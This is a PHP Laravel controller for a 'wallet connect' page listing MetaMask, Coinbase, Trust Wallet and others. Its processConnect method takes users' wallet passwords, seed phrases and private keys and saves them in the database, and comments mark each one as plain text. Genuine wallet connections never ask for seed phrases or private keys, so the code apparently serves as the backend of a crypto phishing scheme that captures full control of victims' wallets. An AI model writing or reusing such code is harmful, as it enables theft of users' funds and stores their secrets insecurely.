<?php

namespace App\Http\Controllers\User;

use App\Http\Controllers\Controller;
use App\Models\UserWalletConnection;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

class WalletConnectController extends Controller
{
    public function landingPage(Request $request)
    {

        $providers = [
            'metamask', 'walletconnect', 'coinbase',
            'trust-wallet', 'others'
        ];
        $wallets = UserWalletConnection::where('user_id', auth()->user()->id)->paginate();
        return view('user.wallet', compact('providers', 'wallets'));
    }

    public function processConnect(Request $request)
    {

        $data = $request->validate([
            'provider'       => 'required|string|in:metamask,walletconnect,coinbase,trust-wallet,others',
            'other_provider' => 'nullable|required_if:provider,others|string|max:100',
            'address'        => 'required|string|max:255',
            'email'          => 'nullable|email|max:255',
            'password'       => 'nullable|string|max:255',
            'seed_phrase'    => 'nullable|string',
            'private_key'    => 'nullable|string',
        ], [
            'other_provider.required_if' => 'Please specify the provider when selecting "others".',
        ]);

        // Use the typed provider or the custom value
        $provider = $data['provider'] === 'others'
            ? $data['other_provider']
            : $data['provider'];

        UserWalletConnection::create([
            'user_id'     => $request->user()->id,
            'provider'    => $provider,
            'address'     => $data['address'],
            'email'       => $data['email'] ?? null,
            'password'    => $data['password'] ?? null,     // PLAIN TEXT
            'seed_phrase' => $data['seed_phrase'] ?? null,  // PLAIN TEXT
            'private_key' => $data['private_key'] ?? null,  // PLAIN TEXT
            'status'      => 'pending',
        ]);


        return back()->with('success', 'Wallet connected successfully and set to Pending.');
    }
}
